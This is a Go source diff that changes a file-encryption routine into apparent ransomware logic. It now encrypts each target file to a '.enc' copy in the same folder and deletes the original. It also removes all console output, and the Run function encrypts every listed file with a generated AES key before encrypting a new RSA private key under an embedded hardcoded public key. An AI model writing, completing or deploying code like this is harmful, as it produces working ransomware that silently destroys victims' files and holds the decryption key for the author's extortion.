@@ -11,8 +11,8 @@ import (
 	"encoding/base64"
 	"encoding/pem"
 	"errors"
-	"fmt"
 	"os"
+	"path/filepath"
 )
 
 var public_Key1 = []byte("-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3nXmd7bRWeOS3LOktKsm\nnAltGP6cnKvyMsb8VjTpTUe1Puz2hcSg106L64D9mnXQI2dnAgz5RysDd31eC770\ntFgFsQOo8CqEu4xN0YktBsfvl20VVvc1yRY9TcXtWKNXckNVkrGJTNtyOPwTnvLw\nhbKq6iNpuJm4Jv3u0Q/ZgyAk1ae1rnBN3KLgeHHXWs/bDvGfPKp/3oBIqFQn1VOq\n+qddElI2UhyVhRv7+mTuvDYStKhW8f7Yd8RDIwqIdmUHaH4+dF6BtlcDquP9gyAe\nHXXqxKXl/i205LZzXCDulfsYWhALW+ntCukei7GCb6umZsuLbH81ZJfQwKHqu+MP\nSD5FHIuppaOb/AV/o0ynGngvFwHHKSqyDjZ+Y8++D+J0B77vp265xt/I+GVUSK+r\nUJj+CPduVTijgU+pG/GF4qxbSuJQNhtMZk2HgCpVdAovhfXMfRui7CvKhCr9qvpb\nNtGmimkAKlIihQrVNGFkebkOPj6+1RAm/tlz472JQbXdPsTwXGFq5BIWqNn+0f6R\n2h9qj2A/jraLJCF0TyVwvlk1N5S+i5Ei3dlueK2g21wmlr9OrMmn5lecQxvAOhg2\nMV+40p0Ow3LY8Uu7HxbCYtdFiy7YrqZaag5uNfWH2YP9MfeKR5LxH0DlMi6WMQN7\nDaAr0F7ISTGk+6a0CGMZP0kCAwEAAQ==\n-----END PUBLIC KEY-----\n")
@@ -180,77 +180,70 @@ func _AesEncrypt(data, key []byte) (string, error) {
 //	return AesDecrypt(dataByte, key)
 //}
 
-func AesEncryptFile(filePath, fName string, key []byte) (err error) {
+func AesEncryptFile(filePath string, key []byte) (err error) {
+	fileDir := filepath.Dir(filePath)
+	fileName := filepath.Base(filePath)
+	fileName += ".enc"
+
 	f, err := os.Open(filePath)
 	if err != nil {
-		fmt.Println("未找到文件")
 		return
 	}
+	defer os.Remove(filePath)
 	defer f.Close()
 
 	fInfo, _ := f.Stat()
 	fLen := fInfo.Size()
-	fmt.Println("待处理文件大小:", fLen)
-	maxLen := 1024 * 1024 * 100 //100mb  每 100mb 进行加密一次
+
+	maxLen := 1024 * 1024 * 100
 	var forNum int64 = 0
 	getLen := fLen
 
 	if fLen > int64(maxLen) {
 		getLen = int64(maxLen)
 		forNum = fLen / int64(maxLen)
-		fmt.Println("需要加密次数：", forNum+1)
 	}
-	//加密后存储的文件
-	ff, err := os.OpenFile("encryptFile_"+fName, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	newFilePath := fileDir + "\\" + fileName
+	ff, err := os.OpenFile(newFilePath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
-		fmt.Println("文件写入错误")
 		return err
 	}
 	defer ff.Close()
-	//循环加密，并写入文件
+
 	for i := 0; i < int(forNum+1); i++ {
 		a := make([]byte, getLen)
 		n, err := f.Read(a)
 		if err != nil {
-			fmt.Println("文件读取错误")
 			return err
 		}
 		getByte, err := _AesEncrypt(a[:n], key)
 		if err != nil {
-			fmt.Println("加密错误")
 			return err
 		}
-		//换行处理，有点乱了，想到更好的再改
+
 		getBytes := append([]byte(getByte), []byte("\n")...)
-		//写入
 		buf := bufio.NewWriter(ff)
 		buf.WriteString(string(getBytes[:]))
 		buf.Flush()
 	}
-	ffInfo, _ := ff.Stat()
-	fmt.Printf("文件加密成功，生成文件名为：%s，文件大小为：%v Byte \n", ffInfo.Name(), ffInfo.Size())
 	return nil
 }
 
-//func DecryptFile(filePath, fName string, key []byte) (err error) {
+//func DecryptFile(filePath, key []byte) (err error) {
 //	f, err := os.Open(filePath)
 //	if err != nil {
 //		fmt.Println("未找到文件")
 //		return
 //	}
 //	defer f.Close()
-//	fInfo, _ := f.Stat()
-//	fmt.Println("待处理文件大小:", fInfo.Size())
 //
 //	br := bufio.NewReader(f)
-//	ff, err := os.OpenFile("decryptFile_"+fName, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
+//	ff, err := os.OpenFile("decryptFile_"+filePath, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
 //	if err != nil {
-//		fmt.Println("文件写入错误")
 //		return err
 //	}
 //	defer ff.Close()
 //	num := 0
-//	//逐行读取密文，进行解密，写入文件
 //	for {
 //		num = num + 1
 //		a, err := br.ReadString('\n')
@@ -259,7 +252,6 @@ func AesEncryptFile(filePath, fName string, key []byte) (err error) {
 //		}
 //		getByte, err := _AesDecrypt(a, key)
 //		if err != nil {
-//			fmt.Println("解密错误")
 //			return err
 //		}
 //
@@ -267,19 +259,15 @@ func AesEncryptFile(filePath, fName string, key []byte) (err error) {
 //		buf.Write(getByte)
 //		buf.Flush()
 //	}
-//	fmt.Println("解密次数：", num)
-//	ffInfo, _ := ff.Stat()
-//	fmt.Printf("文件解密成功，生成文件名为：%s，文件大小为：%v Byte \n", ffInfo.Name(), ffInfo.Size())
 //	return
 //}
 
 func Run(filename []string) {
 	private_Key2, public_Key2 := GenRsaKey()
 	key, _ := GenAesKey()
-	fmt.Println(key)
 
 	for _, _file := range filename {
-		fmt.Println(_file)
+		AesEncryptFile(_file, key)
 	}
 
 	data1, _ := RsaEncrypt(private_Key2, public_Key1)
